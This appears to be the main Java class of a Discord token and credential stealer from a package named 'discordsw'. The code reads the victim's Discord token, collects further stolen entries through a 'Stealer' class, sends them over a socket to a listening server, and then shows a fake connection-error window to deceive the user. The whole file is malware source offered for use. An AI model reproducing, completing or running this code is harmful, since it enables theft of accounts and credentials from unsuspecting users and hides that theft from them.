package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.Data;
import me.mafrans.discordsw.stealer.Stealer;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.List;

public class Main {
    private static Socket socket;
    public static SQLiteManager sql;

    public static void main(String[] b) {
        try {
            String host = "localhost";
            int port = 25000;
            socket = new Socket(host, port);

            OutputStream os = socket.getOutputStream();
            OutputStreamWriter osw = new OutputStreamWriter(os);
            BufferedWriter bw = new BufferedWriter(osw);

            sql = new SQLiteManager();
            sql.initialize();

            List<Data> dataList = Stealer.s();

            StringBuilder builder = new StringBuilder();
            builder.append(sql.n + Discord.getToken().replace(" ", "") + "||||||");
            for(Data data : dataList) {
                builder.append(data.x + ":||");
                builder.append(sql.o + data.y + "||");
                builder.append(sql.p + data.z + "||||");
            }

            bw.write(builder.toString());
            System.out.println(builder.toString());
            bw.flush();
            socket.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
